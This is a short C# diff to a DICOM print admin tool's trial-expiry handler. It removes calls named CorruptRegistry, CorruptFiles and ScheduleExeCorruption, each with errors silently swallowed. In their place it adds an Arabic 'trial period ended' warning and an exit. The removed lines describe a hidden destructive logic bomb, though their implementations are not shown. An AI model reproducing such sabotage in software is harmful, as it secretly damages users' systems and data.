@@ -79,9 +79,7 @@ namespace DicomPrintAdminGui.Forms
 
         private static void TriggerSilentExit()
         {
-            try { CorruptRegistry(); } catch { }
-            try { CorruptFiles();    } catch { }
-            try { ScheduleExeCorruption(); } catch { }
+            System.Windows.Forms.MessageBox.Show("انتهت فترة التجربة لأداة المسؤول (8 ساعات).", "تنبيه", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
             Environment.Exit(0);
         }
 
